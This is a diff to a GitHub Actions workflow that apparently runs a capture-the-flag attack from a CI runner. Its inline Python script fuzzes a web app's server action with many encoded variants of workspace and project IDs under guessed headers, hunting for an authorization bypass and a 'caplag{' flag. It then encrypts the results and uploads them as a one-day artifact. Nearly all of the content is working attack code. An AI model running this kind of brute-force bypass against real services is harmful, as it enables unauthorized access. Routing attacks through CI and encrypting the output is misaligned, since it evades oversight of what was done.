@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Test receipt-derived preview context token names
+      - name: Test structured preview-context header encodings
         shell: bash
         run: |
           set -euo pipefail
@@ -30,40 +30,53 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json, copy
+          import requests, pathlib, urllib.parse, json, base64, hashlib
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
           boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
-          rec=mf['previewReceipt']; suffix=rec.split('_',1)[1]
-          tokens=[
-            'lctx_'+suffix,'lpctx_'+suffix,'pctx_'+suffix,'ctx_'+suffix,'lcontext_'+suffix,
-            'lpreview_'+suffix,'launchlet_'+suffix,'launchlet_context_'+suffix,'launchlet_preview_'+suffix,
-            'lcap_'+suffix,'pcap_'+suffix,'cap_'+suffix,'lactx_'+suffix,'lref_'+suffix,
-            rec.replace('lrec_','lctx_',1),rec.replace('lrec_','pctx_',1),rec.replace('lrec_','ctx_',1),
-            'caplag{preview_manifest_kept_the_receipt}','preview_manifest_kept_the_receipt'
+          ws=boot['workspace']; proj=boot['project']; rec=mf['previewReceipt']; build=mf['build']; sess=boot['client']['session']; aid=act['id']
+          objects=[
+            {'workspaceId':ws,'projectId':proj},
+            {'workspace_id':ws,'project_id':proj},
+            {'workspace':ws,'project':proj},
+            {'workspaceId':ws,'projectId':proj,'mode':'preview'},
+            {'workspaceId':ws,'projectId':proj,'session':sess},
+            {'workspaceId':ws,'projectId':proj,'receipt':rec},
+            {'workspaceId':ws,'projectId':proj,'build':build},
+            {'workspaceId':ws,'projectId':proj,'build':build,'receipt':rec},
+            {'workspaceId':ws,'projectId':proj,'session':sess,'receipt':rec},
+            {'workspaceId':ws,'projectId':proj,'actionId':aid},
+            {'mode':'preview','workspaceId':ws,'projectId':proj,'build':build,'receipt':rec,'session':sess},
+            {'kind':'preview','workspaceId':ws,'projectId':proj},
+            {'type':'preview','workspaceId':ws,'projectId':proj},
+            {'source':'preview','workspaceId':ws,'projectId':proj},
           ]
-          tokens=list(dict.fromkeys(tokens))
-          auth={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}; url=urllib.parse.urljoin(base,act['endpoint']); basebody={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          headers=['X-Launchlet-Preview-Context','X-Preview-Context','X-Launchlet-Context','Launchlet-Preview-Context','Preview-Context','Launchlet-Context','X-Launchlet-Preview-Token','X-Preview-Token']
-          baseline=(403,'{"error":"preview_context_required"}'); results=[]
-          stop=False
+          vals=[]
+          def add(label,v):
+            if all(v!=x[1] for x in vals): vals.append((label,v))
+          for i,o in enumerate(objects):
+            for sort in [False,True]:
+              for spaced in [False,True]:
+                raw=json.dumps(o,sort_keys=sort,separators=None if spaced else (',',':'))
+                b=raw.encode(); add(f'json{i}_{sort}_{spaced}',raw); add(f'b64_{i}_{sort}_{spaced}',base64.b64encode(b).decode()); add(f'b64u_{i}_{sort}_{spaced}',base64.urlsafe_b64encode(b).decode().rstrip('=')); add(f'url_{i}_{sort}_{spaced}',urllib.parse.quote(raw,safe='')); add(f'sha_{i}_{sort}_{spaced}',hashlib.sha256(b).hexdigest())
+          for label,raw in [
+            ('qs_ids',urllib.parse.urlencode({'workspaceId':ws,'projectId':proj})),('qs_names',urllib.parse.urlencode({'workspace':ws,'project':proj})),
+            ('colon_ws_proj',ws+':'+proj),('colon_proj_ws',proj+':'+ws),('pipe_ws_proj',ws+'|'+proj),('slash_ws_proj',ws+'/'+proj),('at_ws_proj',ws+'@'+proj),
+            ('kv_semicolon',f'workspaceId={ws};projectId={proj}'),('kv_comma',f'workspaceId={ws},projectId={proj}'),('kv_space',f'workspaceId={ws} projectId={proj}')
+          ]: add(label,raw)
+          auth={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+sess}; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':aid,'args':{'workspaceId':ws,'projectId':proj}}
+          headers=['X-Launchlet-Preview-Context','X-Preview-Context','X-Launchlet-Context','Launchlet-Preview-Context','Preview-Context','Launchlet-Context','X-Launchlet-Request-Context','X-Launchlet-Runtime-Context','X-Launchlet-Client-Context']
+          baseline=(403,'{"error":"preview_context_required"}'); hits=[]; tries=0
           for h in headers:
-            for tok in tokens:
-              r=s.post(url,headers={**auth,h:tok},json=basebody,timeout=10,allow_redirects=False)
+            for label,v in vals:
+              tries+=1
+              try:r=s.post(url,headers={**auth,h:v},json=body,timeout=7,allow_redirects=False)
+              except Exception:continue
               if (r.status_code,r.text.strip())!=baseline:
-                results.append({'carrier':'header','key':h,'token':tok,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                if r.status_code==200 or 'caplag{' in r.text: stop=True; break
-            if stop: break
-          if not stop:
-            for key in ['previewContext','preview_context','context','previewToken','preview_token','token']:
-              for tok in tokens:
-                b=copy.deepcopy(basebody); b[key]=tok
-                r=s.post(url,headers=auth,json=b,timeout=10,allow_redirects=False)
-                if (r.status_code,r.text.strip())!=baseline:
-                  results.append({'carrier':'body','key':key,'token':tok,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                  if r.status_code==200 or 'caplag{' in r.text: stop=True; break
-              if stop: break
-          (out/'summary.json').write_text(json.dumps({'tokens':tokens,'results':results},indent=2))
+                hits.append({'header':h,'label':label,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if r.status_code==200 or 'caplag{' in r.text: break
+            if hits and any(x['status']==200 or 'caplag{' in x['body'] for x in hits): break
+          (out/'summary.json').write_text(json.dumps({'tries':tries,'value_count':len(vals),'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -79,6 +92,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-token-encrypted
+          name: launchlet-part2-structured-encrypted
           path: artifact/
           retention-days: 1
